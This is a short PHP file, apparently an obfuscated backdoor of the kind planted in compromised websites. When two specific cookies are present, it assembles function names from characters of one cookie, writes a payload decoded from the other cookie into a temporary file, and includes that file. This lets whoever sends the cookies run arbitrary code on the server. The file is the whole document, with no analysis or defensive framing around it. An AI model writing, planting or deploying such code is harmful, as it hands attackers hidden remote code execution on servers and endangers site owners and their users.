<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[26])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[26][$n];
        if (!$c[26][$n + 1]) {
            if (!$c[26][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[19]() . $p[29];
    if (!$p[20]($k)) {
        $n = $p[9]($k, $p[0]);
        $p[12]($n, $p[18] . $p[14]($p[25]($c[3])));
    }
    include($k);
}